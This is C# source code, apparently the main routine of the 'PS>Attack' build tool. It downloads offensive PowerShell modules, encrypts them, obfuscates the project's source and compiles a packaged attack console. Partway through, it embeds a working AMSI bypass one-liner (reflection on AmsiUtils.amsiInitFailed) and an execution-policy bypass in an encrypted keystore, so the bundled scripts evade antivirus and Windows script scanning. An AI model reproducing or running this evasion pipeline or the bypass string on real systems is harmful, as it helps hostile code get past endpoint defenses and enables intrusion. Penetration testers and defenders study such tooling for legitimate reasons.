using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Runtime.Serialization.Json;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Timers;
using PSAttackBuildTool.Modules;
using PSAttackBuildTool.Utils;
using PSAttackBuildTool.PSAttack;
using PSAttackBuildTool.ObfuscationEngine;

namespace PSAttackBuildTool
{
    class Program
    {
        static void Main(string[] args)
        {

            // PRINT START MESSAGE
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine(Strings.psaStartMsg);
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(Strings.psaWarningMsg);
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("\n Press any key to start the build process..");
            Console.ReadLine();
            Console.Clear();

            //PRINT LOGO
            //Console.ForegroundColor = ConsoleColor.DarkYellow;
            //Random random = new Random();
            //int psaLogoInt = random.Next(Strings.psabtLogos.Count);
            //Console.WriteLine(Strings.psabtLogos[psaLogoInt]);
            //Console.WriteLine("Version {0}\n", Strings.version);
            //Console.ForegroundColor = ConsoleColor.White;

            Display display = new Display();
            GeneratedStrings generatedStrings = new GeneratedStrings();
            Random random = new Random();

            // DELETE BUILD DIR
            display.updateStage("Initializing..");
            display.updateStatus("Clearing Build Dir: " + PSABTUtils.GetPSAttackBuildToolDir());
            Directory.Delete(PSABTUtils.GetPSAttackBuildToolDir(), true);

            //READ JSON FILE
            display.updateStage("Initializing..");
            display.updateStatus("Loading modules.json");
            StreamReader sr = new StreamReader("modules.json");
            string modulesJson = sr.ReadToEnd();
            MemoryStream memReader = new MemoryStream(Encoding.UTF8.GetBytes(modulesJson));
            List<Module> modules = PSABTUtils.GetModuleList(memReader);
            string workingDir = PSABTUtils.GetPSAttackBuildToolDir();

            //GET PS>ATTACK 
            display.updateStage("Getting PS>Attack");
            display.updateStatus("Searching Github");
            Attack attack = PSABTUtils.GetPSAttack(new Uri(Strings.attackURL));
            display.updateStatus("Found Version: " + attack.tag_name);
            display.updateMessage("Downloading " + attack.zipball_url);
            attack.DownloadZip();
            display.updateMessage("Unzipping to: " + Strings.attackUnzipDir);
            attack.unzipped_dir = PSABTUtils.UnzipFile(Strings.attackZipPath);

            // PROCESS PS>ATTACK
            display.updateStage("Preparing PS>Attack Build");

            // CLEAR OUT BUNDLED MODULES
            display.updateStatus("Clearing modules at: " + attack.modules_dir);
            display.updateMessage("");
            attack.ClearModules();

            // CREATE DIRECTORY STRUCTURE
            
            if (!(Directory.Exists(Strings.moduleSrcDir)))
            {
                display.updateStatus("Creating Modules Source Directory: " + Strings.moduleSrcDir);
                Directory.CreateDirectory(Strings.moduleSrcDir);
            }

            if (!(Directory.Exists(Strings.obfuscatedScriptsDir)))
            {
                display.updateStatus("Creating Obfuscated Modules Directory: " + Strings.obfuscatedScriptsDir);
                Directory.CreateDirectory(Strings.obfuscatedScriptsDir);
            }

            if (!(Directory.Exists(Strings.obfuscatedSourceDir)))
            {
                display.updateStatus("Creating Obfuscated Source Directory: " + Strings.obfuscatedSourceDir);
                Directory.CreateDirectory(Strings.obfuscatedSourceDir);
            }

            // CLEAR OUT OBFUSCATED SCRIPTS DIR
            DirectoryInfo dirInfo = new DirectoryInfo(Strings.obfuscatedScriptsDir);
            foreach (FileInfo file in dirInfo.GetFiles())
            {
                display.updateStatus("Clearing Obfuscated Modules Directory");
                display.updateMessage("Deleting: " + file.Name);
                file.Delete();
            }

            // MAKE NEW MODULES
            display.updateStage("Processing Modules");
            display.updateStatus("");
            display.updateMessage("");
            foreach (Module module in modules)
            {
                string dest = Path.Combine(Strings.moduleSrcDir, (module.name + ".ps1"));
                string encOutfile = attack.modules_dir + CryptoUtils.EncryptString(attack, module.name, generatedStrings);
                try
                {
                    display.updateStatus("Processing " + module.name);
                    display.updateMessage("Downloading from " + module.url);
                    PSABTUtils.DownloadFile(module.url, dest);
                    display.updateMessage("Encrypting " + module.name);
                    CryptoUtils.EncryptFile(attack, dest, encOutfile, generatedStrings);
                }
                catch (Exception e)
                {
                    ConsoleColor origColor = Console.ForegroundColor;
                    Console.ForegroundColor = ConsoleColor.Red;
                    display.updateStatus("ERROR!!");
                    display.updateMessage("There was an error processing " + module.name + " This will probably break the build.");
                    display.updateSecondaryMessage("Error message: " + e.Message + "\n\n Press enter to continue building PS>Attack..");
                    Console.ReadLine();
                    Console.ForegroundColor = origColor;

                }
            }

            // PLACE MATTS AMSI BYPASS IN KEYSTORE
            generatedStrings.Store.Add("amsiBypass", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)");
            generatedStrings.Store.Add("setExecutionPolicy", "Set-ExecutionPolicy Bypass -Scope Process -Force");
            generatedStrings.Store.Add("buildDate", DateTime.Now.ToString());

            // WRITE KEYS TO CSV
            DataContractJsonSerializer jsonSerializer = new DataContractJsonSerializer(typeof(Dictionary<string, string>));
            string keyStoreFileName = PSABTUtils.RandomString(64, new Random());
            generatedStrings.Store.Add("keyStoreFileName", keyStoreFileName);
            using (StreamWriter keystoreCSV = new StreamWriter(Path.Combine(PSABTUtils.GetPSAttackBuildToolDir(), "keystore.csv")))
            {
                foreach (KeyValuePair<string, string> entry in generatedStrings.Store)
                {
                    keystoreCSV.WriteLine("{0}|{1}", entry.Key, entry.Value);
                }
            }

            // Encrypt keystore
            CryptoUtils.EncryptFile(attack, Path.Combine(PSABTUtils.GetPSAttackBuildToolDir(), "keystore.csv"), Path.Combine(attack.resources_dir, keyStoreFileName), generatedStrings);


            // GENERATE CSPROJ FILE
            display.updateStage("Building PS>Attack");
            display.updateStatus("Generating PSAttack.csproj at " + attack.csproj_file);
            display.updateMessage("");
            PSABTUtils.BuildCsproj(modules, attack, generatedStrings);

            // GENERATE SETTINGS FILE
            display.updateStage("Building PS>Attack");
            display.updateStatus("Generating Config File at " + attack.config_file);
            display.updateMessage("");
            PSABTUtils.BuildConfigFile(attack, generatedStrings);

            // GENERATE SETTINGS DESIGNER FILE
            //display.updateStage("Building PS>Attack");
            //display.updateStatus("Generating Settings Designer File at " + attack.config_file);
            //display.updateMessage("");
            //PSABTUtils.BuildSettingsDesignerFile(attack, generatedStrings);

            // OBFUSCATE
            ObfuscationEngine.ObfuscationEngine engine = new ObfuscationEngine.ObfuscationEngine(generatedStrings);
            string[] files = Directory.GetFiles(Strings.attackUnzipDir, "*.*", SearchOption.AllDirectories);
            foreach (string file in files)
            {
                engine.ProcessSource(display, file, generatedStrings, attack);
            }
            
            // BUILD PS>ATTACK
            Timer timer = new Timer(1200);
            display.updateStatus("Kicking off build");
            display.updateMessage("3..");
            display.updateMessage("3.. 2..");
            display.updateMessage("3.. 2.. 1..\n\n\n");
            Console.ForegroundColor = ConsoleColor.Gray;
            int exitCode = PSABTUtils.BuildPSAttack(attack, generatedStrings);
            if (exitCode == 0)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(Strings.psaEndSuccess, Strings.attackBuildDir);
                Console.ReadLine();
                Process.Start(Strings.attackBuildDir);
            }
            else if (exitCode == 999)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(Strings.psaEndNoMSBuild, System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory());
                Console.ReadLine();
                Environment.Exit(exitCode);
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(Strings.psaEndFailure);
                Console.ReadLine();
                Environment.Exit(exitCode);

            }

        }
    }
}
